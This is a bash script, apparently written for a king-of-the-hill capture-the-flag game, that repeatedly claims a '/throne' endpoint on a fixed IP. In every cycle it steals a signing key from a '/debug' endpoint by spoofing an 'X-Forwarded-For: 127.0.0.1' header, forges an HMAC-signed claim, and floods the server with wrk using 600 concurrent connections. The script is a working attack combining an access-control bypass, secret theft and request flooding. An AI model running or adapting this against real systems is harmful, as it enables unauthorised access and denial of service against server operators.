#!/bin/bash
# Flood The Throne using wrk, re-fetching the key + refreshing the signed
# claim every cycle (key rotates server-side unpredictably).

TEAM="242cb7b1d3645528"
URL="http://13.37.197.230:28490/throne"
DEBUG_URL="http://13.37.197.230:28490/debug"
LUA="$HOME/Téléchargements/throne.lua"
THREADS=24
CONNECTIONS=600
DURATION="20s"

while true; do
  HILL_KEY=$(curl -s "$DEBUG_URL" -H "X-Forwarded-For: 127.0.0.1" | python3 -c "import sys,json; print(json.load(sys.stdin)['hill_key'])")
  if [ -z "$HILL_KEY" ]; then
    echo "[!] failed to fetch hill_key, retrying in 2s"
    sleep 2
    continue
  fi
  TS=$(date +%s)
  SIG=$(python3 -c "
import hmac, hashlib
team='$TEAM'
ts=$TS
key='$HILL_KEY'
msg = f'{team}|{ts}'.encode()
print(hmac.new(key.encode(), msg, hashlib.sha1).hexdigest())
")
  export CLAIM_BODY="{\"team\":\"$TEAM\",\"ts\":$TS,\"sig\":\"$SIG\"}"
  echo "[*] $(date '+%H:%M:%S') key=${HILL_KEY:0:10}... ts=$TS sig=${SIG:0:12}..."
  wrk -t$THREADS -c$CONNECTIONS -d$DURATION "$URL" -s "$LUA"
done
